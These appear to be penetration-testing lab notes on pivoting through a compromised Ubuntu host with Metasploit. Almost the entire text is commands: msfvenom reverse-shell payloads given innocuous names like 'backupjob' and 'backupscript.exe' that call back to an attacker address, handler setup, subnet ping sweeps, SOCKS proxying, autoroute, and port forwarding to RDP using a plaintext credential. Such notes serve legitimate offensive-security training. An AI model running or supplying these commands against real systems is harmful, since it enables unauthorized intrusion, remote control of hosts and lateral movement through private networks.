
**Creating Payload for Ubuntu Pivot Host
```shell-session
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

**Configuring & Starting the multi/handler
```shell-session
use exploit/multi/handler
```
```shell-session
set lhost 0.0.0.0
```
```shell-session
set lport 8080
```
```shell-session
set payload linux/x64/meterpreter/reverse_tcp
```
```shell-session
run
```

Copy the payload over to the pivot host
- scp /path/to/local/file username@remote_host:/path/to/remote/destination

**Executing the Payload on the Pivot Host
```shell-session
ls
```
```shell-session
chmod +x backupjob 
```
```shell-session
./backupjob
```

**Meterpreter Session Establishment
```shell-session
pwd
```

**Ping Sweep
```shell-session
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

**Ping Sweep For Loop on Linux Pivot Hosts
```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

**Ping Sweep For Loop Using CMD
```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

**Ping Sweep Using PowerShell
```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

- Ping sweep at least twice to ensure the arp cache gets built


- If ICMP ping is blocked by firewall, we will socks proxy

**Configuring MSF's SOCKS Proxy
```shell-session
use auxiliary/server/socks_proxy
```
```shell-session
set SRVPORT 9050
```
```shell-session
set SRVHOST 0.0.0.0
```
```shell-session
set version 4a
```
```shell-session
run
```
```shell-session
jobs
```

**Adding a Line to proxychains.conf if needed
```shell-session
socks4 	127.0.0.1 9050
```

**Creating Routes with AutoRoute
```shell-session
use post/multi/manage/autoroute
```
```shell-session
set SESSION 1
```
```shell-session
set SUBNET 172.16.5.0
```
```shell-session
run
```

**Or

```shell-session
run autoroute -s 172.16.5.0/23
```
(meterpreter session)

```shell-session
run autoroute -p
```

**Testing Proxy & Routing Functionality
```shell-session
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

**Port Forwarding
```shell-session
help portfwd
```

**Creating Local TCP Relay
```shell-session
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
- -l starts a listener on our local attack host's local port 3300
- -r forward all the packets to the remote Windows server 172.16.5.19 on
- -p port 3389 via our Meterpreter session

**Connecting to Windows Target through localhost
```shell-session
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```
```shell-session
netstat -antp
```


### Meterpreter Reverse Port Forwarding

**Reverse Port Forwarding Rules
```shell-session
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
- forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port 8081.
- We configure our listener to listen on port 8081 for a Windows shell.

**Configuring & Starting multi/handler
```shell-session
bg
```
```shell-session
set payload windows/x64/meterpreter/reverse_tcp
```
```shell-session
set LPORT 8081
```
```shell-session
set LHOST 0.0.0.0 
```
```shell-session
run
```

**Generating the Windows Payload
```shell-session
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

